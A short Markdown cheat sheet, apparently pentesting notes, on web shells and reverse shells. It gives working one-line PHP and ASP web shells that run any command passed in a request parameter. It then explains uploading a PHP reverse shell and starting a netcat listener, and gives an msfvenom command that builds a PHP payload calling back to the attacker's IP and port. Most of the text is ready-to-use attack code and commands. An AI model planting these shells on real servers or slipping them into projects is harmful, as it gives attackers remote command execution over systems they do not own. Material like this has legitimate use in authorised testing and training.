# Web Shells
***
### ***Web shell***
#### A web shell is a malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by sending HTTP requests to the right endpoint.


### [PHP bash web shell](https://github.com/Arrexel/phpbash)

### [Web Shells from SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)

### Simple Web Shell in PHP
```php
<?php system($_GET['cmd']); ?>
```

#### When using the above script, it's best to use source-view (**[CTRL+U]**), to only check the command output without HTML rendering.

### Simple Web Shell For .NET
```asp
<% eval request('cmd') %>
```

### Reverse Shell
#### A reverse shell is a type of shell where the victim initiates a connection to our machine
#### [pentestmonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell)
#### First we need to set up our listener ip and port:
```php
$ip = 'my_ip'
$port = my port
```
#### Then just start a listener (**netcat**) with the port used above, upload the script onto the web application, and finally visit the link to execute the script.
#### Setting up netcat
```shell
$ nc -lvnp my_port
```

### Generating Custom Reverse Shell Scripts using **MSFVenom**
```shell
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```
#### -p flag is to set up the payload, and to specify the output language we can use the -f flag
